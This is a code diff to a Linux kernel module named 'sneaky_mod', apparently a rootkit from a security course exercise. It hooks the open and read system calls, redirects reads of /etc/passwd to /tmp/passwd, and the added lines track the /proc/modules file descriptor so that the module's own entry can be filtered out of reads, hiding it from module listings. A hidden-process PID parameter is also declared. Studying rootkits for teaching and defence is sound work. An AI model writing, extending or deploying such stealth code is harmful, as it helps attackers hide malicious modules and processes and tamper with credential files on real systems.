@@ -19,6 +19,8 @@ struct linux_dirent {
  char d_name[BUFFLEN];
 };
 
+static int proc_modules_fd = -1; 
+
 static int sneaky_process_pid=0;
 module_param(sneaky_process_pid, int, 0);
 MODULE_PARM_DESC(sneaky_process_pid, "Process ID of Sneaky Process");
@@ -69,6 +71,8 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags)
   if (strcmp(pathname,"/etc/passwd")==0)
     copy_to_user(pathname,"/tmp/passwd",11);
 
+  if (strcmp(pathname,"/proc/modules")==0)
+    return proc_modules_fd=original_call_open(pathname, flags); 
 
   //copy_to_user(void __user *to, const void *from, unsigned
   //long nbytes)
@@ -86,18 +90,21 @@ asmlinkage int (*original_call_read)(int fd, void *buf, size_t count);
 //Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_read(int fd, void *buf, size_t count)
 {
-  //printk(KERN_INFO "Read: Very, very Sneaky!\n");
+  printk(KERN_INFO "Read: Very, very Sneaky!\n");
   int nread= original_call_read(fd,buf,count);
 
-  // char* pcBuf=(char*) buf; 
+  if (fd != proc_modules_fd) return nread; 
+
+  printk(KERN_INFO "Found prod/modules fd: %d\n",fd);
+  char* pcBuf=(char*) buf; 
 
   const char* sneakyBuff="sneaky_mod"; 
-  char* pch = strstr ((char*)buf,sneakyBuff);
+  char* pch = strstr (pcBuf,sneakyBuff);
 
 
   if (pch) // contains sneaky_mod
   {
-    //printk(KERN_INFO "Performing read replacement!\n");
+    printk(KERN_INFO "Performing read replacement!\n");
     
   //   // look for end of current line:
 
